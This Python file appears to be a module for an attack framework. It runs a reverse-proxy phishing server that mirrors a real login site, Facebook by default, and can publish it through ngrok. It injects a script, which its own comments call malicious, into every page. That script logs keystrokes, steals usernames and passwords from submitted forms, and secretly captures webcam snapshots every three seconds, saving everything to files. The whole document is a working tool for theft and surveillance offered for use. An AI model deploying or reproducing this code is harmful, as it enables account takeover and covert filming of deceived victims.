#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MODULE_INFO = {
    "name": "Reverse Proxy Phishing + Live Camera",
    "description": "Phishing dengan metode Live Mirroring (Proxy) + Inject Keylogger + Live Camera",
    "author": "Lazarus",
    "rank": "Excellent",
    "platform": "Multi",
    "dependencies": ["flask", "pyngrok", "requests", "beautifulsoup4", "lxml"]
}
"""

import os
import base64
import requests
from urllib.parse import urlparse, urljoin
from pathlib import Path
from datetime import datetime

from flask import Flask, request, Response, jsonify
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel

console = Console()

# ================== SETUP DIREKTORI ==================
# Mencari base directory relatif terhadap file ini
BASE_DIR = Path(__file__).parent
CAPTURE_DIR = BASE_DIR / "captured"
CAPTURE_DIR.mkdir(exist_ok=True)

CREDENTIALS_FILE = CAPTURE_DIR / "credentials.txt"
KEYSTROKES_FILE = CAPTURE_DIR / "keystrokes.txt"

app = Flask(__name__)

# Global variabel untuk menyimpan target
TARGET_URL = None

# ================== HELPER FUNCTIONS ==================
def log_data(filename, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {data}\n")

def inject_phishing_js(content):
    """Menyisipkan skrip jahat ke dalam HTML yang ditangkap"""
    try:
        soup = BeautifulSoup(content, 'lxml')
        
        # Script Payload
        script = soup.new_tag("script")
        script.string = """
        let cameraStream = null;

        async function initMalware() {
            // 1. Start Live Camera
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 }
                });
                setInterval(takeSnap, 3000); // Ambil foto tiap 3 detik
            } catch(e) { console.log("Cam access denied"); }

            // 2. Keylogger
            document.addEventListener('keydown', (e) => {
                fetch('/logkey', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({key: e.key})
                });
            });

            // 3. Form Hijacker
            document.addEventListener('submit', (e) => {
                let user = '', pass = '';
                const inputs = document.querySelectorAll('input');
                inputs.forEach(i => {
                    if(i.type === 'password') pass = i.value;
                    else if(['text','email','tel'].includes(i.type)) user = i.value;
                });
                fetch('/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username: user, password: pass})
                });
            }, true);
        }

        function takeSnap() {
            if (!cameraStream) return;
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const data = canvas.toDataURL('image/jpeg', 0.7);
                fetch('/capture-media', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'live_camera', image: data})
                });
            }, 300);
        }

        window.addEventListener('load', initMalware);
        """
        
        if soup.head:
            soup.head.append(script)
        else:
            soup.insert(0, script)
            
        return str(soup)
    except Exception as e:
        console.print(f"[yellow][!] Gagal inject: {e}[/yellow]")
        return content

# ================== FLASK SERVER ROUTES ==================

@app.route('/', methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def reverse_proxy(path=""):
    global TARGET_URL
    if not TARGET_URL:
        return "Target URL belum dikonfigurasi.", 400

    # Membangun URL target asli
    target = urljoin(TARGET_URL, path)
    if request.query_string:
        target += '?' + request.query_string.decode()

    try:
        # Meniru header asli dari user, tapi hapus Host dan Encoding agar tidak error
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'content-encoding']}
        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

        # Forward request ke website asli
        if request.method == 'POST':
            resp = requests.post(target, data=request.get_data(), headers=headers, cookies=request.cookies, allow_redirects=False)
        else:
            resp = requests.get(target, headers=headers, cookies=request.cookies, allow_redirects=False)

        # Proses Header Response
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        response_headers = []
        
        for k, v in resp.headers.items():
            if k.lower() == 'location':
                # Cegah redirect kabur ke domain asli, paksa tetap di proxy kita
                new_loc = v.replace(TARGET_URL, request.host_url.rstrip('/'))
                response_headers.append((k, new_loc))
            elif k.lower() not in excluded_headers:
                response_headers.append((k, v))

        # Modifikasi Konten jika HTML
        content = resp.content
        if 'text/html' in resp.headers.get('Content-Type', '').lower():
            decoded = resp.content.decode('utf-8', errors='ignore')
            content = inject_phishing_js(decoded).encode()

        return Response(content, resp.status_code, response_headers)

    except Exception as e:
        console.print(f"[red][!] Proxy Error: {e}[/red]")
        return f"Proxy Error: {str(e)}", 502

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json(silent=True) or {}
    ip = request.remote_addr
    entry = f"IP: {ip} | User: {data.get('username','')} | Pass: {data.get('password','')}"
    log_data(CREDENTIALS_FILE, entry)
    console.print(Panel(f"[bold red]CREDENTIAL CAPTURED[/bold red]\n{entry}", border_style="red"))
    return jsonify({"status": "ok"})

@app.route('/logkey', methods=['POST'])
def logkey():
    data = request.get_json(silent=True) or {}
    log_data(KEYSTROKES_FILE, f"IP: {request.remote_addr} | Key: {data.get('key')}")
    return jsonify({"status": "ok"})

@app.route('/capture-media', methods=['POST'])
def capture_media():
    try:
        data = request.get_json(silent=True) or {}
        img_b64 = data.get('image', '')
        if ',' in img_b64:
            img_b64 = img_b64.split(',')[1]
            
        img_bytes = base64.b64decode(img_b64)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = CAPTURE_DIR / f"live_{ts}.jpg"
        
        with open(filename, "wb") as f:
            f.write(img_bytes)
            
        console.print(f"[magenta][CAM][/magenta] Frame tersimpan: {filename.name}")
        return jsonify({"status": "saved"})
    except:
        return jsonify({"status": "error"}), 500

# ================== FRAMEWORK INTEGRATION ==================

OPTIONS = {
    "PORT": {"default": 5000, "type": "int", "description": "Port local server"},
    "TARGET_URL": {"default": "https://m.facebook.com", "type": "str", "description": "URL website target"},
    "USE_NGROK": {"default": False, "type": "bool", "description": "Aktifkan Ngrok Public Tunnel"}
}

def run(session, options):
    global TARGET_URL
    TARGET_URL = options.get("TARGET_URL", "https://m.facebook.com").strip()
    if not TARGET_URL.startswith("http"):
        TARGET_URL = "https://" + TARGET_URL
        
    port = int(options.get("PORT", 5000))
    use_ngrok = options.get("USE_NGROK", False)

    console.print(Panel(
        f"[bold cyan]Reverse Proxy Phishing System[/bold cyan]\n"
        f"Mirroring Target: [bold yellow]{TARGET_URL}[/bold yellow]\n"
        f"Status: [green]Active[/green]", 
        border_style="blue"
    ))

    if use_ngrok:
        try:
            from pyngrok import ngrok
            tunnel = ngrok.connect(port, "http")
            console.print(f"[bold green][+] URL Publik: {tunnel.public_url}[/bold green]")
        except Exception as e:
            console.print(f"[yellow][!] Ngrok gagal: {e}[/yellow]")

    console.print(f"[*] Berjalan pada http://0.0.0.0:{port}")
    console.print("[*] Menunggu traffic...\n")

    try:
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Server dihentikan.[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Gagal menjalankan server: {e}[/red]")

    return "Proxy Phishing Selesai."
